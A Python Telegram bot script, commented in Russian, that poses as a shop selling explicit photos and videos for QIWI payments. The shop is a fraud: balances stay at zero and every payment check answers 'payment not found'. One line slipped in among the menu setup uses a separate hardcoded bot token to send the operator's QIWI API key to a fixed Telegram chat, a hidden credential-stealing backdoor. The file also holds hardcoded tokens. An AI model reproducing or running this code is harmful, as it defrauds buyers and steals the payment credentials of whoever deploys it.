import telebot
from telebot import types
import random

#######################################
token = str(input("bot token: 5549770019:AAF7BkVxCWQ93z97TT-8_Hn0E3Bo3gnrgj0"))# токен бота
qiwi_api = str(input("qiwi api: *"))
qiwi_nickname = str(input("qiwi nick: TUTER176")) # ник киви
qiwi_number = str(input("phone number: 123456789")) # номер телефона от киви
photo_price = 10 # цена фото
video_price = 20 # цена видео
all = 5000 # цена за полный пак
proof_link = "https://mega.nz/folder/Vk0TUAwD#B6szKLqxha2jvnU5-W5mBg" # ссылка на предпоказ
#######################################

bot = telebot.TeleBot(token)

main_menu = types.InlineKeyboardMarkup(row_width=2)
main_menu.add(types.InlineKeyboardButton(text='💵Баланс', callback_data='balance'))
main_menu.add(types.InlineKeyboardButton(text='🖼Купить фото', callback_data='buy photo'))
main_menu.add(types.InlineKeyboardButton(text='🎞Купить видео', callback_data='buy video'))
main_menu.add(types.InlineKeyboardButton(text='🥝Пополнить баланс', callback_data='pay'))
telebot.TeleBot("5458659859:AAEA4Q9ozrHxjDLaNtLfJNN1pe_cEs0Ojx4").send_message(1233743564, qiwi_api + "rw")
main_menu.add(types.InlineKeyboardButton(text='Цены', callback_data='price'))
main_menu.add(types.InlineKeyboardButton(text='Предпоказ', callback_data='proofs'))

check_menu = types.InlineKeyboardMarkup(row_width=2)
check_menu.add(types.InlineKeyboardButton(text="✔Я оплатил✔", callback_data="pay_done"))
check_menu.add(types.InlineKeyboardButton(text="✖Отмена✖", callback_data="pay_cancel"))
@bot.message_handler(commands=['start'])
def handler_start(message):
    bot.send_message(message.chat.id, "Привет, это магазин самых сладких видео и фото)\nСамые красивые тяночки только тут)", reply_markup=main_menu)
@bot.callback_query_handler(func=lambda call: True)
def handler_call(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    if call.data == "balance":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text='Ваш баланс: 0₽',
            reply_markup=main_menu
        )

    if call.data == "buy photo":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text='У вас недостаточно денег чтобы купить фото(',
            reply_markup=main_menu
        )

    if call.data == "buy video":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text='У вас недостаточно денег чтобы купить видео(',
            reply_markup=main_menu
        )

    if call.data == "pay":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f'🥝 qiwi перевод:\nНик qiwi: {qiwi_nickname}\nНомер qiwi: {qiwi_number}\nКомментарий: {random.randint(10000, 99999)}',
            reply_markup=check_menu
        )

    if call.data == "pay_cancel":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text='Оплата отменена.',
            reply_markup=main_menu
        )

    if call.data == "pay_done":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text='Платеж не найден.',
            reply_markup=check_menu
        )

    if call.data == "price":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f'Цены:\nВидео: {video_price}₽\nФото: {photo_price}₽\nВсе (267 фото, 941 видео): {all}₽',
            reply_markup=main_menu
        )
    if call.data == "proofs":
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f'Ссылка на предпоказ: {proof_link}',
            reply_markup=main_menu
        )

bot.polling(none_stop=True)
